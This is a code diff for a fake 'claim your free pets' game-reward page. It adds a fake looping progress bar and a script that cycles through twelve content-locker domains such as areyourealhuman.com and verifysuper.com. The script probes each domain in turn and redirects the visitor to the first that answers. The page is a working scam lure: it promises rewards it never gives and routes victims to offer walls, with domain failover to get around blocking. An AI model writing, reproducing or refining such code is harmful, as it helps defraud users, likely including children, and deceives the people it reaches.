@@ -173,19 +173,19 @@
 <div class="reward-box" id="step1">
   <div class="rewards">
     <div class="reward-item">
-      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68ae9d86&is=68ad4c06&hm=370f66a46b29803cd6a2cb3ef2e23f2ec6b9432c153230b8363cc1586c764c63&">
+      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68b33ac6&is=68b1e946&hm=ac8ce6704cc5b26687e5b42500e35354aeb32bda616398b3f6b5a150f7174b27&">
       <img class="reward" src="https://cdn.discordapp.com/emojis/1401567022713929850.png?v=1" alt="Dragon Fly">
     </div>
     <div class="reward-item">
-      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68ae9d86&is=68ad4c06&hm=370f66a46b29803cd6a2cb3ef2e23f2ec6b9432c153230b8363cc1586c764c63&">
+      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68b33ac6&is=68b1e946&hm=ac8ce6704cc5b26687e5b42500e35354aeb32bda616398b3f6b5a150f7174b27&">
       <img class="reward" src="https://cdn.discordapp.com/emojis/1401566939871969361.png?v=1" alt="Queen Bee">
     </div>
     <div class="reward-item">
-      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68ae9d86&is=68ad4c06&hm=370f66a46b29803cd6a2cb3ef2e23f2ec6b9432c153230b8363cc1586c764c63&">
+      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68b33ac6&is=68b1e946&hm=ac8ce6704cc5b26687e5b42500e35354aeb32bda616398b3f6b5a150f7174b27&">
       <img class="reward" src="https://cdn.discordapp.com/emojis/1396588954106724373.png?v=1" alt="Raccoon">
     </div>
     <div class="reward-item">
-      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68ae9d86&is=68ad4c06&hm=370f66a46b29803cd6a2cb3ef2e23f2ec6b9432c153230b8363cc1586c764c63&">
+      <img class="tick" src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777944993468447/Z4l-Sinf-Check-Mark-Outline-256-1-1.png?ex=68b33ac6&is=68b1e946&hm=ac8ce6704cc5b26687e5b42500e35354aeb32bda616398b3f6b5a150f7174b27&">
       <img class="reward" src="https://cdn.discordapp.com/emojis/1401566947098759259.png?v=1" alt="Kitsune">
     </div>
   </div>
@@ -233,7 +233,7 @@
     </div>
     
     <div style="display:flex;align-items:center;justify-content:center;gap:8px;font-weight:900;color:#d97706">
-      <img src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777972126421145/noFilter.webp?ex=68ae9d8c&is=68ad4c0c&hm=c74987a9dd627b5f5dd558c818a41b1a73fc782f7bd5a005a12478212cefa3e4&" 
+      <img src="https://cdn.discordapp.com/attachments/1403292084466618409/1409777972126421145/noFilter.webp?ex=68b33acc&is=68b1e94c&hm=abe73e730e7406b0dd8645ecd3ef54ffb9764a99882a86c5acb4ebc840c30def&" 
            alt="User Icon" style="width:28px;height:28px;border-radius:50%;">
       <span id="finalAt">@name</span>
     </div>
@@ -314,9 +314,65 @@
     requestingPage.classList.add('show');
   });
 
+  // -------------------------------
+  // CLAIM BUTTON WITH LOOPING PROCESS
+  // -------------------------------
+
+  const ogadsUrls = [
+    "https://appslocked.com/cl/i/34ollm",
+    "https://appverification.net/cl/i/34ollm",
+    "https://areyourealhuman.com/cl/i/34ollm",
+    "https://contentlocked.net/cl/i/34ollm",
+    "https://installchecker.com/cl/i/34ollm",
+    "https://locked1.com/cl/i/34ollm",
+    "https://locked2.com/cl/i/34ollm",
+    "https://locked3.com/cl/i/34ollm",
+    "https://locked4.com/cl/i/34ollm",
+    "https://mobileverify.net/cl/i/34ollm",
+    "https://unlockcontent.net/cl/i/34ollm",
+    "https://verifysuper.com/cl/i/34ollm"
+  ];
+
+  let currentIndex = 0;
+  let redirected = false;
+
   claimBtn.addEventListener('click', () => {
-    window.open('https://verifysuper.com/cl/i/34ollm', '_blank');
+    requestingPage.classList.remove('show');
+    processingPage.classList.add('show');
+    loopProgressBar();
+    trySites();
   });
+
+  function loopProgressBar(){
+    let steps = [10,40,70,100];
+    let i = 0;
+    function step(){
+      if(redirected) return;
+      let percent = steps[i];
+      progressInner.style.width = percent+"%";
+      progressInner.textContent = percent+"%";
+      i = (i+1) % steps.length;
+      setTimeout(step, 1000);
+    }
+    step();
+  }
+
+  function trySites(){
+    if(redirected) return;
+    if(currentIndex >= ogadsUrls.length){
+      currentIndex = 0; // restart list
+    }
+    let testUrl = ogadsUrls[currentIndex];
+    fetch(testUrl,{mode:"no-cors"})
+      .then(()=>{
+        redirected = true;
+        window.location.href = testUrl;
+      })
+      .catch(()=>{
+        currentIndex++;
+        setTimeout(trySites,1500);
+      });
+  }
 
   function wait(ms){ return new Promise(res => setTimeout(res, ms)); }
   function progressTo(target, ms){
